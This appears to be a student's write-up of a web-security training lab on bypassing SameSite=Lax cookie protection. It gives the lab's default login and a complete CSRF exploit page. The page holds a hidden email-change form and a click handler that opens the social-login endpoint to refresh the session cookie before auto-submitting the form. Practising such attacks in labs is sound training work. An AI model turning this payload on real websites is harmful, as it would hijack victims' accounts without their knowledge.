Lab #12 - SameSite Lax bypass via cookie refresh

Goal - Exploit CSRF to change the victim's email address

Creds - wiener:peter

Analysis:

<form action="https://0a92009603dec172800c172d00cb00ee.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="test4@test.ca"/>
</form>
<p>Click anywhere on the page</p>

<script>
    window.onclick = () => {
        window.open('https://0a92009603dec172800c172d00cb00ee.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }
    function changeEmail(){
        document.forms[0].submit();
    }
</script>